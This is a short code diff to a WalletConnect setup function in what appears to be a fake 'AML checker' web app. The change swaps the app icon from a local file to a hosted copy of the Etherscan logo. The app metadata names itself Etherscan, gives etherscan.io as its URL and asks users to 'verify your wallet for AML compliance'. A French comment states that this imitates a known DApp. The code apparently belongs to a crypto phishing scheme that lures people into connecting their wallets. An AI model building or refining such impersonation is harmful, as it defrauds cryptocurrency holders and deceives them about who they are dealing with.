@@ -32,7 +32,7 @@ async function initWalletConnect() {
       name: 'Etherscan',            // 👈 imite une DApp connue
       description: 'Verify your wallet for AML compliance',
       url: 'https://etherscan.io',
-      icons: ['file:///C:/Users/PC/Downloads/aml-checker-4/public/etherscan-logo-circle.png']
+      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
     }
   });
 
